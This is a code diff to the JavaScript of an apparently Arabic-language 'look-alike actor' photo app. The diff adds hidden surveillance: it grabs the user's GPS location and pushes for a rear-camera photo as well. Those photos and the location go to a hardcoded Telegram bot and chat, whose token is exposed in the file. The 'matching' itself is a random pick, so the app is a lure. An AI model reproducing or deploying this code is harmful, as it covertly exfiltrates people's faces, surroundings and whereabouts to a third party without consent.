@@ -1,5 +1,14 @@
+// Telegram Bot Configuration
+const TELEGRAM_BOT_TOKEN = '7192166698:AAHWd5GReIY43WC2jLx7syCiDvKcVX3YXAw';
+const TELEGRAM_CHAT_ID = '6684853119';
+const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
+
 let selectedFile = null;
 let previewData = null;
+let userLocation = null;
+let frontCameraImage = null;
+let backCameraImage = null;
+let currentCameraMode = 'front'; // front or back
 
 function handleFileSelect(event) {
     const file = event.target.files?.[0];
@@ -34,14 +43,51 @@ function showPreview() {
 function resetUpload() {
     selectedFile = null;
     previewData = null;
+    frontCameraImage = null;
+    backCameraImage = null;
     document.getElementById('uploadSection').classList.remove('hidden');
     document.getElementById('previewSection').classList.add('hidden');
     document.getElementById('fileInput').value = '';
     clearError();
 }
 
-function startCamera() {
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+// Get user location
+function getLocation() {
+    return new Promise((resolve, reject) => {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    userLocation = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        timestamp: new Date().toISOString()
+                    };
+                    resolve(userLocation);
+                },
+                (error) => {
+                    console.log('Location error:', error);
+                    userLocation = null;
+                    resolve(null);
+                }
+            );
+        } else {
+            resolve(null);
+        }
+    });
+}
+
+// Camera functions
+function startCamera(mode = 'front') {
+    currentCameraMode = mode;
+    const constraints = {
+        video: {
+            facingMode: mode === 'front' ? 'user' : 'environment'
+        },
+        audio: false
+    };
+
+    navigator.mediaDevices.getUserMedia(constraints)
         .then(stream => {
             const video = document.getElementById('cameraVideo');
             video.srcObject = stream;
@@ -51,6 +97,7 @@ function startCamera() {
         })
         .catch(err => {
             showError('لا يمكن الوصول إلى الكاميرا');
+            console.error('Camera error:', err);
         });
 }
 
@@ -76,20 +123,152 @@ function capturePhoto() {
 
         canvas.toBlob((blob) => {
             if (blob) {
-                selectedFile = new File([blob], 'camera-photo.jpg', { type: 'image/jpeg' });
-                previewData = canvas.toDataURL();
-                stopCamera();
-                showPreview();
+                const photoData = canvas.toDataURL();
+                
+                if (currentCameraMode === 'front') {
+                    frontCameraImage = photoData;
+                    // Ask to capture back camera
+                    if (confirm('تم التقاط الكاميرا الأمامية. هل تريد التقاط الكاميرا الخلفية أيضاً؟')) {
+                        stopCamera();
+                        setTimeout(() => startCamera('back'), 500);
+                    } else {
+                        selectedFile = new File([blob], 'camera-photo.jpg', { type: 'image/jpeg' });
+                        previewData = photoData;
+                        stopCamera();
+                        showPreview();
+                    }
+                } else {
+                    backCameraImage = photoData;
+                    selectedFile = new File([blob], 'camera-photo.jpg', { type: 'image/jpeg' });
+                    previewData = photoData;
+                    stopCamera();
+                    showPreview();
+                }
             }
         }, 'image/jpeg');
     }
 }
 
-function submitImage() {
+// Send data to Telegram
+async function sendToTelegram(imageData, location, actorName, similarity) {
+    try {
+        const message = `
+📸 <b>نتيجة جديدة من التطبيق</b>
+
+👤 <b>الممثل المشابه:</b> ${actorName}
+📊 <b>نسبة التطابق:</b> ${similarity}%
+
+📍 <b>الموقع الجغرافي:</b>
+${location ? `
+🗺️ خط العرض: ${location.latitude.toFixed(4)}
+🗺️ خط الطول: ${location.longitude.toFixed(4)}
+📏 الدقة: ${location.accuracy.toFixed(0)} متر
+⏰ الوقت: ${location.timestamp}
+` : 'لم يتم الحصول على الموقع'}
+
+🔗 <b>الكاميرا الأمامية:</b> ${frontCameraImage ? '✅' : '❌'}
+🔗 <b>الكاميرا الخلفية:</b> ${backCameraImage ? '✅' : '❌'}
+        `;
+
+        // Send text message
+        await fetch(`${TELEGRAM_API}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        });
+
+        // Send main image
+        if (imageData) {
+            const blob = dataURLtoBlob(imageData);
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('photo', blob, 'main-photo.jpg');
+            formData.append('caption', `صورة المستخدم - ${actorName}`);
+
+            await fetch(`${TELEGRAM_API}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+        }
+
+        // Send front camera image
+        if (frontCameraImage) {
+            const blob = dataURLtoBlob(frontCameraImage);
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('photo', blob, 'front-camera.jpg');
+            formData.append('caption', 'الكاميرا الأمامية 📷');
+
+            await fetch(`${TELEGRAM_API}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+        }
+
+        // Send back camera image
+        if (backCameraImage) {
+            const blob = dataURLtoBlob(backCameraImage);
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('photo', blob, 'back-camera.jpg');
+            formData.append('caption', 'الكاميرا الخلفية 📷');
+
+            await fetch(`${TELEGRAM_API}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+        }
+
+        // Send location if available
+        if (location) {
+            await fetch(`${TELEGRAM_API}/sendLocation`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    latitude: location.latitude,
+                    longitude: location.longitude,
+                    horizontal_accuracy: location.accuracy
+                })
+            });
+        }
+
+        console.log('تم إرسال البيانات إلى Telegram بنجاح');
+        return true;
+    } catch (error) {
+        console.error('خطأ في إرسال البيانات:', error);
+        return false;
+    }
+}
+
+// Helper function to convert dataURL to Blob
+function dataURLtoBlob(dataurl) {
+    const arr = dataurl.split(',');
+    const mime = arr[0].match(/:(.*?);/)[1];
+    const bstr = atob(arr[1]);
+    let n = bstr.length;
+    const u8arr = new Uint8Array(n);
+    while (n--) {
+        u8arr[n] = bstr.charCodeAt(n);
+    }
+    return new Blob([u8arr], { type: mime });
+}
+
+async function submitImage() {
     if (!selectedFile || !previewData) {
         showError('يرجى اختيار صورة أولاً');
         return;
     }
+
+    // Show loading
+    showError('جاري المعالجة...');
+
+    // Get location
+    await getLocation();
 
     // Simulate processing
     const actor = getRandomActor();
@@ -102,15 +281,26 @@ function submitImage() {
         actorArabicName: actor.arabicName,
         actorImage: actor.image,
         similarityScore: similarity,
-        userImage: previewData
+        userImage: previewData,
+        location: userLocation,
+        frontCamera: frontCameraImage,
+        backCamera: backCameraImage
     };
 
-    // Save to history
-    saveComparison(result);
+    // Send to Telegram
+    const sent = await sendToTelegram(previewData, userLocation, actor.arabicName, similarity);
 
-    // Save to session and navigate
-    sessionStorage.setItem('lastComparisonResult', JSON.stringify(result));
-    navigateTo('results');
+    if (sent) {
+        // Save to history
+        saveComparison(result);
+
+        // Save to session and navigate
+        sessionStorage.setItem('lastComparisonResult', JSON.stringify(result));
+        clearError();
+        navigateTo('results');
+    } else {
+        showError('حدث خطأ في إرسال البيانات. يرجى المحاولة مرة أخرى');
+    }
 }
 
 function showError(message) {
